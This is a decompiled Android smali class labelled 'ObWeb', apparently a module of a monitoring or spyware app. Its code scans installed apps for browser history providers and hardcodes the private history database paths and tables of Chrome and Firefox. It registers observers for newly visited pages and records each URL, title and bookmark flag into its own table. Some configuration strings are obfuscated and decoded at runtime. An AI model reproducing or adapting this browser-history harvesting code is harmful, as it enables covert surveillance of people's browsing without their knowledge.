.class public Lb/d/d/y0;
.super Lcom/utils/core/h0/j;
.source ""


# static fields
.field public static final k:Ljava/lang/String;

.field public static final l:Ljava/lang/String;

.field public static final m:Ljava/lang/String;

.field private static n:Z

.field public static o:Z

.field public static final p:Lb/d/d/y0;


# instance fields
.field public j:Ljava/util/ArrayList;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    const-string v1, "3t2PYOBHw5QQ3MraExQvUA=="

    invoke-static {v1, v0}, Lcom/utils/core/g0;->a(Ljava/lang/String;Z)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lb/d/d/y0;->k:Ljava/lang/String;

    const-string v1, "iStpXVU4Hl2WvPTVQihbzQ=="

    invoke-static {v1, v0}, Lcom/utils/core/g0;->a(Ljava/lang/String;Z)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lb/d/d/y0;->l:Ljava/lang/String;

    const-string v1, "4QGHDRAo5gtxKC6tB906CA=="

    invoke-static {v1, v0}, Lcom/utils/core/g0;->a(Ljava/lang/String;Z)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lb/d/d/y0;->m:Ljava/lang/String;

    sput-boolean v0, Lb/d/d/y0;->n:Z

    sput-boolean v0, Lb/d/d/y0;->o:Z

    new-instance v0, Lb/d/d/y0;

    invoke-direct {v0}, Lb/d/d/y0;-><init>()V

    sput-object v0, Lb/d/d/y0;->p:Lb/d/d/y0;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    const-string v0, "ObWeb"

    const/16 v1, 0x131

    const-string v2, "web"

    invoke-direct {p0, v0, v1, v2}, Lcom/utils/core/h0/j;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    const/4 v0, 0x0

    iput-object v0, p0, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    new-instance v0, Lcom/utils/core/o;

    invoke-direct {v0, p0}, Lcom/utils/core/o;-><init>(Lcom/utils/core/h0/j;)V

    iput-object v0, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    return-void
.end method

.method public static a(Ljava/util/List;JLjava/lang/String;Ljava/lang/String;I)V
    .locals 3

    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    invoke-static {p1, p2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    const-string v2, "id_web"

    invoke-virtual {v0, v2, v1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    const-string v1, "url"

    invoke-virtual {v0, v1, p3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string p3, "title"

    invoke-virtual {v0, p3, p4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const/4 p3, -0x1

    if-le p5, p3, :cond_0

    const/4 p3, 0x1

    invoke-static {p3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p3

    const-string p4, "isbm"

    invoke-virtual {v0, p4, p3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_0
    invoke-static {p1, p2}, Lcom/utils/core/u;->a(J)Ljava/lang/String;

    move-result-object p1

    const-string p2, "uuid"

    invoke-virtual {v0, p2, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {p0, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method private u()V
    .locals 16

    move-object/from16 v1, p0

    const/4 v0, 0x2

    new-array v2, v0, [[Ljava/lang/String;

    const/16 v3, 0x8

    new-array v4, v3, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "com.android.chrome"

    aput-object v6, v4, v5

    const/4 v6, 0x1

    const-string v7, "app_chrome/"

    aput-object v7, v4, v6

    const-string v7, "Default"

    aput-object v7, v4, v0

    const/4 v7, 0x3

    const-string v8, "History"

    aput-object v8, v4, v7

    const/4 v8, 0x4

    const-string v9, "chr"

    aput-object v9, v4, v8

    const/4 v9, 0x5

    const-string v10, "urls"

    aput-object v10, v4, v9

    const/4 v10, 0x6

    const-string v11, "id"

    aput-object v11, v4, v10

    const/4 v11, 0x7

    const-string v12, "last_visit_time"

    aput-object v12, v4, v11

    aput-object v4, v2, v5

    new-array v4, v3, [Ljava/lang/String;

    const-string v12, "org.mozilla.firefox"

    aput-object v12, v4, v5

    const-string v12, "files/mozilla/"

    aput-object v12, v4, v6

    const-string v12, "*.default"

    aput-object v12, v4, v0

    const-string v0, "browser.db"

    aput-object v0, v4, v7

    const-string v0, "frf"

    aput-object v0, v4, v8

    const-string v0, "history"

    aput-object v0, v4, v9

    const-string v0, "_id"

    aput-object v0, v4, v10

    const-string v0, "date"

    aput-object v0, v4, v11

    aput-object v4, v2, v6

    :try_start_0
    iget-object v0, v1, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    if-nez v0, :cond_d

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, v1, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    const-string v0, ""

    sget-object v4, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    if-eqz v4, :cond_b

    invoke-virtual {v4, v3}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_b

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/pm/PackageInfo;

    iget-object v4, v4, Landroid/content/pm/PackageInfo;->providers:[Landroid/content/pm/ProviderInfo;

    if-eqz v4, :cond_a

    array-length v7, v4

    move-object v8, v0

    const/4 v0, 0x0

    :goto_1
    if-ge v0, v7, :cond_9

    aget-object v9, v4, v0

    iget-object v10, v9, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    invoke-static {v10}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_8

    const-string v11, ".browser"

    invoke-virtual {v10, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    const/4 v12, -0x1

    if-gt v11, v12, :cond_0

    iget-object v11, v9, Landroid/content/pm/ProviderInfo;->readPermission:Ljava/lang/String;

    invoke-static {v11}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_8

    iget-object v11, v9, Landroid/content/pm/ProviderInfo;->readPermission:Ljava/lang/String;

    const-string v13, "READ_HISTORY_BOOKMARKS"

    invoke-virtual {v11, v13}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v11

    if-le v11, v12, :cond_8

    :cond_0
    sget-boolean v11, Lb/d/d/y0;->o:Z

    if-eqz v11, :cond_1

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "\n pk:"

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, " at:\'"

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v9, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "\' pm:"

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v9, Landroid/content/pm/ProviderInfo;->readPermission:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    :cond_1
    iget-object v11, v1, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    invoke-virtual {v11}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :goto_2
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v13

    const/4 v14, 0x0

    if-eqz v13, :cond_3

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Lb/d/d/w0;

    iget-object v15, v13, Lb/d/d/w0;->a:Ljava/lang/String;

    iget-object v12, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v15, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_2

    goto :goto_3

    :cond_2
    const/4 v12, -0x1

    goto :goto_2

    :cond_3
    move-object v13, v14

    :goto_3
    if-nez v13, :cond_8

    new-instance v11, Lb/d/d/w0;

    iget-object v12, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    iget-object v13, v9, Landroid/content/pm/ProviderInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v13, v13, Landroid/content/pm/ApplicationInfo;->dataDir:Ljava/lang/String;

    invoke-direct {v11, v12, v13, v14}, Lb/d/d/w0;-><init>(Ljava/lang/String;Ljava/lang/String;Lb/d/d/u0;)V

    array-length v12, v2

    const/4 v13, 0x0

    :goto_4
    if-ge v13, v12, :cond_5

    aget-object v14, v2, v13

    aget-object v15, v14, v5

    iget-object v5, v9, Landroid/content/pm/ProviderInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v15, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-virtual {v11, v14}, Lb/d/d/w0;->a([Ljava/lang/String;)V

    :cond_4
    add-int/lit8 v13, v13, 0x1

    const/4 v5, 0x0

    goto :goto_4

    :cond_5
    iget-object v5, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Add "

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v11, Lb/d/d/w0;->a:Ljava/lang/String;

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v5, v9}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    invoke-virtual {v5, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-static {}, Lcom/utils/core/g0;->w()Z

    move-result v5

    if-eqz v5, :cond_6

    iget-object v5, v11, Lb/d/d/w0;->a:Ljava/lang/String;

    const/16 v9, 0x131

    iget v12, v11, Lb/d/d/w0;->j:I

    invoke-static {v5, v9, v12, v6}, Lb/d/f/g;->a(Ljava/lang/String;IIZ)V

    :cond_6
    const-string v5, ";"

    invoke-virtual {v10, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    const/4 v9, -0x1

    if-le v5, v9, :cond_7

    const/4 v9, 0x0

    invoke-virtual {v10, v9, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Lb/d/d/w0;->a(Ljava/lang/String;)V

    add-int/lit8 v9, v5, 0x1

    invoke-virtual {v10, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v9

    move-object v10, v9

    goto :goto_5

    :cond_7
    invoke-virtual {v11, v10}, Lb/d/d/w0;->a(Ljava/lang/String;)V

    :goto_5
    const/4 v9, -0x1

    if-gt v5, v9, :cond_6

    :cond_8
    add-int/lit8 v0, v0, 0x1

    const/4 v5, 0x0

    goto/16 :goto_1

    :cond_9
    move-object v0, v8

    :cond_a
    const/4 v5, 0x0

    goto/16 :goto_0

    :cond_b
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_c

    iget-object v2, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Inf: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    :cond_c
    const/4 v0, 0x0

    sput-boolean v0, Lb/d/d/y0;->o:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_6

    :catch_0
    move-exception v0

    iget-object v2, v1, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v3, "checkInstalledBrowsers"

    invoke-static {v2, v3, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_d
    :goto_6
    return-void
.end method


# virtual methods
.method public a(Ljava/lang/String;)V
    .locals 2

    const-string v0, "3.1.180"

    invoke-static {p1, v0}, La/b/a/a;->a(Ljava/lang/String;Ljava/lang/String;)I

    move-result p1

    if-gez p1, :cond_0

    iget-object p1, p0, Lcom/utils/core/h0/j;->h:Lcom/utils/core/o;

    const-string v0, "isbm"

    const-string v1, "INTEGER DEFAULT \'0\' NOT NULL"

    .line 1
    invoke-virtual {p1, v0, v1}, Lcom/utils/core/o;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public b(Z)V
    .locals 0

    invoke-static {}, Lcom/utils/core/d0;->j()Z

    move-result p1

    if-eqz p1, :cond_0

    invoke-static {}, Lcom/utils/core/q;->c()V

    :cond_0
    invoke-virtual {p0}, Lb/d/d/y0;->m()V

    return-void
.end method

.method public c()Z
    .locals 1

    invoke-static {}, Lcom/utils/core/g0;->v()Z

    move-result v0

    return v0
.end method

.method public e()Ljava/lang/String;
    .locals 2

    const-string v0, "web"

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/utils/core/u;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public f()V
    .locals 5

    :try_start_0
    new-instance v0, Lb/d/d/u0;

    iget-object v1, p0, Lcom/utils/core/h0/e;->b:Ljava/lang/String;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "url"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "title"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "isbm"

    aput-object v4, v2, v3

    invoke-direct {v0, p0, v1, v2}, Lb/d/d/u0;-><init>(Lb/d/d/y0;Ljava/lang/String;[Ljava/lang/String;)V

    iput-object v0, p0, Lcom/utils/core/h0/e;->d:Lb/d/a/g;

    invoke-virtual {p0}, Lcom/utils/core/h0/j;->s()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v2, "gEToS"

    invoke-static {v1, v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method public h()Ljava/lang/String;
    .locals 2

    sget-object v0, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    const v1, 0x7f0c00c8

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public l()V
    .locals 5

    iget-object v0, p0, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lb/d/d/w0;

    iget-object v1, v1, Lb/d/d/w0;->m:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_1
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lb/d/d/x0;

    if-eqz v2, :cond_1

    const/4 v3, 0x0

    .line 1
    iput-boolean v3, v2, Lb/d/d/x0;->g:Z

    sget-object v4, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    invoke-virtual {v4, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    iput-boolean v3, v2, Lb/d/d/x0;->h:Z

    goto :goto_0

    :cond_2
    return-void
.end method

.method public m()V
    .locals 9

    sget-boolean v0, Lb/d/d/y0;->n:Z

    if-nez v0, :cond_4

    const/4 v0, 0x1

    sput-boolean v0, Lb/d/d/y0;->n:Z

    const/4 v1, 0x0

    :try_start_0
    invoke-direct {p0}, Lb/d/d/y0;->u()V

    iget-object v2, p0, Lb/d/d/y0;->j:Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lb/d/d/w0;

    iget-object v4, v3, Lb/d/d/w0;->m:Ljava/util/ArrayList;

    invoke-virtual {v4}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lb/d/d/x0;

    iget-boolean v6, v5, Lb/d/d/x0;->h:Z

    if-nez v6, :cond_1

    iget-boolean v6, v5, Lb/d/d/x0;->g:Z

    if-eqz v6, :cond_1

    iget-object v6, v5, Lb/d/d/x0;->b:Landroid/net/Uri;

    if-eqz v6, :cond_1

    iget-object v6, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, " new O: "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v5, Lb/d/d/x0;->b:Landroid/net/Uri;

    invoke-static {v8}, Lcom/utils/core/g0;->a(Landroid/net/Uri;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v6, Lcom/utils/core/CoreApplication;->a:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    iget-object v7, v5, Lb/d/d/x0;->b:Landroid/net/Uri;

    invoke-virtual {v6, v7, v0, v5}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    iput-boolean v0, v5, Lb/d/d/x0;->h:Z

    :cond_1
    invoke-static {v3, v5, v1}, Lb/d/d/w0;->a(Lb/d/d/w0;Lb/d/d/x0;Z)V

    goto :goto_1

    :cond_2
    iget-boolean v4, v3, Lb/d/d/w0;->c:Z

    if-eqz v4, :cond_0

    invoke-static {}, Lcom/utils/core/d0;->j()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-static {v3}, Lb/d/d/w0;->a(Lb/d/d/w0;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v2, p0, Lcom/utils/core/h0/e;->a:Ljava/lang/String;

    const-string v3, "upd l "

    invoke-static {v2, v3, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_3
    sput-boolean v1, Lb/d/d/y0;->n:Z

    :cond_4
    return-void
.end method

.method public n()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public r()Ljava/util/ArrayList;
    .locals 6

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/utils/core/o;->g:Ljava/lang/String;

    const-string v3, "id_web"

    const-string v4, " INTEGER,"

    const-string v5, "url"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " VARCHAR NOT NULL,"

    const-string v3, "isbm"

    const-string v4, " INTEGER DEFAULT \'0\' NOT NULL,"

    const-string v5, "title"

    invoke-static {v1, v2, v3, v4, v5}, Lb/a/a/a/a;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, " VARCHAR NOT NULL);"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-object v0
.end method

.method public t()Ljava/util/ArrayList;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method
